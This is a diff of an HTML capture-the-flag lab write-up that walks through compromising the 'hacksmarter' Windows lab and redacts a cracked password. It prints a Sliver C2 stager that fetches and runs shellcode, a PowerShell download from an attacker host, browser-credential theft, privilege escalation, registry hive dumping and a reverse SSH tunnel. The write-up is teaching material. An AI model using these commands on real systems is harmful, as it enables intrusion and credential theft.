@@ -181,9 +181,38 @@
   <p>Another operator already exploited a file upload vulnerability and provided a web shell:</p>
   <pre><code>http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami</code></pre>
 
+  <h3>Attack Chain Summary</h3>
+  <div class="attack-chain">
+    <pre><code>Web Shell (provided by prior operator)
+    |
+    v
+Nim Stager + Sliver C2 --> Session as j.smith (IIS AppPool)
+    |
+    v
+SharpChrome --> b.morgan browser credentials extracted
+    |
+    v
+RDP as b.morgan --> Interactive access
+    |
+    v
+Unquoted Service Path --> b.morgan added to local Administrators
+    |
+    v
+GodPotato --> SYSTEM access
+    |
+    v
+SAM/SECURITY Hive Dump --> p.richardson hash cracked
+    |
+    v
+Reverse SSH Tunnel --> SOCKS proxy to internal network
+    |
+    v
+MySQL Access (sqlsrv.hacksmarter) --> Final Flag Retrieved</code></pre>
+  </div>
+
   <h2>Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <h3>Nmap Scan</h3>
   <p>I started with a full port scan of the web server:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn web.hacksmarter -oN nmap_scan</code></pre>
 
@@ -200,7 +229,7 @@
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
 
   <div class="note">
-    <strong>Note:</strong> The <code>-oN</code> flag saves output in normal format.
+    <strong>Note:</strong> The <code>-oN</code> flag saves output in normal format. The original used <code>-o</code> which is not a valid nmap flag.
   </div>
 
   <p>Key findings:</p>
@@ -210,7 +239,7 @@
     <li>WinRM enabled (port 5985)</li>
   </ul>
 
-  <h3><span class="step">[Step 2]</span> Verifying Web Shell Access</h3>
+  <h3>Verifying Web Shell Access</h3>
   <p>I navigated to the web shell URL to confirm RCE:</p>
   <p><img src="../assets/staged/image-76.png" alt="Web shell confirming command execution" loading="lazy"></p>
 
@@ -225,7 +254,7 @@
     A stager is a small payload that downloads and executes a larger payload (shellcode) in memory. This technique helps evade antivirus by keeping the malicious code off disk and fetching it dynamically at runtime.
   </div>
 
-  <h3><span class="step">[Step 3]</span> Generate Shellcode and Start Listener</h3>
+  <h3><span class="step">[Step 1]</span> Generate Shellcode and Start Listener</h3>
   <p>In Sliver C2, I generated shellcode and started an mTLS listener:</p>
   <pre><code>sliver > generate --mtls 10.200.27.205:443 --os windows --arch amd64 --format shellcode --save /tmp/shell.bin
 
@@ -246,7 +275,7 @@ sliver > mtls -L 10.200.27.205 -l 443
     Mutual TLS (mTLS) is a two-way authentication protocol where both client and server verify each other's certificates. In C2 frameworks like Sliver, mTLS provides encrypted, authenticated communication that blends in with legitimate HTTPS traffic.
   </div>
 
-  <h3><span class="step">[Step 4]</span> Create the Nim Stager</h3>
+  <h3><span class="step">[Step 2]</span> Create the Nim Stager</h3>
   <p>I compiled this Nim stager on a Windows VM. The stager fetches shellcode over HTTP and executes it in memory:</p>
   <pre><code class="language-nim">import winim/lean
 import httpclient
@@ -285,19 +314,19 @@ when defined(windows):
 
   <p><img src="../assets/staged/image-77.png" alt="Nim stager compilation output" loading="lazy"></p>
 
-  <h3><span class="step">[Step 5]</span> Transfer Stager to Attack Machine</h3>
+  <h3><span class="step">[Step 3]</span> Transfer Stager to Attack Machine</h3>
   <p>I set up an SMB server to transfer the compiled stager:</p>
   <pre><code>$ impacket-smbserver sharename . -smb2support -username panos -password panos123</code></pre>
 
   <p>Then connected from Windows and copied the file:</p>
   <p><img src="../assets/staged/image-78.png" alt="Transferring stager.exe via SMB" loading="lazy"></p>
 
-  <h3><span class="step">[Step 6]</span> Host Payload Files</h3>
+  <h3><span class="step">[Step 4]</span> Host Payload Files</h3>
   <p>I moved the shellcode to my working directory and started an HTTP server:</p>
   <pre><code>$ mv /tmp/shell.bin .
 $ python3 -m http.server 8080</code></pre>
 
-  <h3><span class="step">[Step 7]</span> Upload and Execute Stager</h3>
+  <h3><span class="step">[Step 5]</span> Upload and Execute Stager</h3>
   <p>Using the web shell, I uploaded the stager with a URL-encoded PowerShell command:</p>
   <pre><code class="language-powershell">powershell -ep bypass -c "iwr -uri http://10.200.27.205:8080/stager.exe -outfile C:\xampp\htdocs\hacksmarter\uploads\stager.exe"</code></pre>
 
@@ -322,7 +351,7 @@ $ python3 -m http.server 8080</code></pre>
 ---  Credential (Path: C:\Users\j.smith\AppData\Local\Microsoft\Edge\User Data\Default\Login Data) ---
 
 file_path,signon_realm,origin_url,date_created,times_used,username,password
-...,https://hacksmarter.org/,https://hacksmarter.org/,...,b.morgan,O3KA6B#y1$15</code></pre>
+...,https://hacksmarter.org/,https://hacksmarter.org/,...,b.morgan,[REDACTED]</code></pre>
 
   <div class="question">
     <strong>What is SharpChrome?</strong>
@@ -331,17 +360,17 @@ file_path,signon_realm,origin_url,date_created,times_used,username,password
     SharpChrome is a .NET tool that decrypts saved credentials from Chromium-based browsers (Chrome, Edge, Brave). It extracts the AES encryption key from the browser's Local State file and uses it to decrypt passwords stored in the Login Data SQLite database.
   </div>
 
-  <p>Credentials found: <code>b.morgan:O3KA6B#y1$15</code></p>
+  <p>Credentials found: <code>b.morgan:[REDACTED]</code></p>
 
-  <h3><span class="step">[Step 8]</span> RDP Access</h3>
+  <h3>RDP Access</h3>
   <p>With these credentials, I established an RDP session:</p>
-  <pre><code>$ xfreerdp /u:b.morgan /p:'O3KA6B#y1$15' /v:web.hacksmarter</code></pre>
+  <pre><code>$ xfreerdp /u:b.morgan /p:'[REDACTED]' /v:web.hacksmarter</code></pre>
 
   <p><img src="../assets/staged/image-82.png" alt="RDP session as b.morgan" loading="lazy"></p>
 
   <h2>Privilege Escalation</h2>
 
-  <h3><span class="step">[Step 9]</span> Finding the Vulnerability</h3>
+  <h3>Finding the Vulnerability</h3>
   <p>I enumerated for unquoted service paths:</p>
   <pre><code class="language-powershell">PS C:\> cmd /c 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""'
 
@@ -369,7 +398,7 @@ C:\Program Files\Note Taking App EC2AMAZ-IBNMCK4\b.morgan:(OI)(CI)(F)</code></pr
 
   <p>The <code>(F)</code> indicates Full Control, meaning b.morgan can write to this directory.</p>
 
-  <h3><span class="step">[Step 10]</span> Exploiting the Service</h3>
+  <h3>Exploiting the Service</h3>
   <p>I created a simple C# payload to add b.morgan to the local administrators group:</p>
   <pre><code class="language-csharp">using System;
 using System.Diagnostics;
@@ -429,7 +458,7 @@ nt authority\system</code></pre>
 
   <p><img src="../assets/staged/image-84.png" alt="GodPotato confirming SYSTEM access" loading="lazy"></p>
 
-  <h3><span class="step">[Step 11]</span> Extracting SAM/SECURITY Hives</h3>
+  <h3>Extracting SAM/SECURITY Hives</h3>
   <p>I used esentutl (a legitimate Windows binary) to copy protected registry hives:</p>
 
   <div class="question">
@@ -445,16 +474,16 @@ PS C:\> C:\Windows\Temp\gp.exe -cmd "esentutl.exe /y /vss C:\Windows\System32\co
 
   <p><img src="../assets/staged/image-85.png" alt="Esentutl extracting registry hives" loading="lazy"></p>
 
-  <h3><span class="step">[Step 12]</span> Extracting Hashes</h3>
+  <h3>Extracting Hashes</h3>
   <p>I transferred the hive files to my attack machine and used secretsdump:</p>
   <pre><code>$ impacket-secretsdump -system sys -sam sam -security sec LOCAL
 
 [*] Target system bootKey: 0x...
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:[REDACTED]:[REDACTED]:::
-j.smith:1002:[REDACTED]:[REDACTED]:::
-b.morgan:1003:[REDACTED]:[REDACTED]:::
-p.richardson:1006:[REDACTED]:[REDACTED]:::</code></pre>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
+j.smith:1002:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
+b.morgan:1003:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
+p.richardson:1006:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>
 
   <div class="question">
     <strong>What are SAM, SYSTEM, and SECURITY hives?</strong>
@@ -469,7 +498,7 @@ p.richardson:1006:[REDACTED]:[REDACTED]:::</code></pre>
     <p>You need both SAM and SYSTEM together to extract usable NTLM hashes.</p>
   </div>
 
-  <h3><span class="step">[Step 13]</span> Cracking Hashes</h3>
+  <h3>Cracking Hashes</h3>
   <p>I cracked p.richardson's hash with hashcat:</p>
   <pre><code>$ hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
@@ -479,7 +508,7 @@ p.richardson:1006:[REDACTED]:[REDACTED]:::</code></pre>
 
   <h2>Pivoting to Internal Network</h2>
 
-  <h3><span class="step">[Step 14]</span> Setting Up SSH Tunnel</h3>
+  <h3>Setting Up SSH Tunnel</h3>
   <p>I established a reverse SSH tunnel from the Windows box to create a SOCKS proxy. First, I started an SSH server on my attack machine on a non-standard port:</p>
   <pre><code>$ sudo systemctl start ssh
 # Or use a custom port with: ssh -p 2222</code></pre>
@@ -496,7 +525,7 @@ p.richardson:1006:[REDACTED]:[REDACTED]:::</code></pre>
     A reverse SSH tunnel creates an outbound connection from the target network back to your attack machine. The <code>-N</code> flag means no remote command (just forwarding), and <code>-R 1080</code> opens port 1080 on your attack machine as a SOCKS proxy. All traffic sent to localhost:1080 gets forwarded through the compromised Windows host to reach internal systems that are otherwise inaccessible.
   </div>
 
-  <h3><span class="step">[Step 15]</span> Configuring Proxychains</h3>
+  <h3>Configuring Proxychains</h3>
   <p>I added the SOCKS5 proxy to <code>/etc/proxychains4.conf</code>:</p>
   <pre><code>[ProxyList]
 socks5  127.0.0.1 1080</code></pre>
@@ -544,7 +573,7 @@ MariaDB [hacksmarter_db]> select * from final_config;
 
   <h2>Summary</h2>
 
-  <p>This lab demonstrated a realistic red team engagement involving:</p>
+  <p>This lab demonstrated a realistic penetration test engagement involving:</p>
 
   <div class="attack-chain">
     <ol>
